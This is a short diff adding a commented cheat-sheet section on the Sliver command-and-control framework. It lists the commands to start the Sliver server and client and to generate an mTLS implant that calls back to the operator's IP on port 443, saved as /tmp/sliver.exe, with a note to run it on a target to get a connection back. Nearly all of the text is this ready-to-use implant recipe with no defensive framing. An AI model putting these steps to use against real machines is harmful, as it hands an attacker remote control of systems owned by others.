@@ -1,0 +1,12 @@
+# =======================
+# 3. Sliver (Golang-based C2 framework)
+# Purpose: Start server, generate implant, and listen for callbacks
+# =======================
+sliver-server
+
+# In new terminal:
+sliver-client
+
+# Inside Sliver client:
+generate --mtls <your-IP>:443 --save /tmp/sliver.exe
+# (Execute sliver.exe on target to connect back)
